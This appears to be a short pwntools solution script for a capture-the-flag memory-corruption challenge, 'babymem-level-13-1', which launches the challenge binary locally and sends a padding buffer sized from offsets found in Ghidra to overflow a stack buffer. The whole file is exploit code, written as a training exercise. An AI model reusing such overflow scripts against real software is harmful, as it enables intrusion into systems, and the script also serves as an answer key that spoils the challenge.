from pwn import *

elf = ELF("/challenge/babymem-level-13-1")

io = elf.process()

# Ghidra
f_offset = int("11f", 16)
b_offset = int("128", 16)

payload = b'A' * (b_offset - f_offset)

io.sendline(f"{len(payload)}")
io.sendline(payload)

io.interactive()
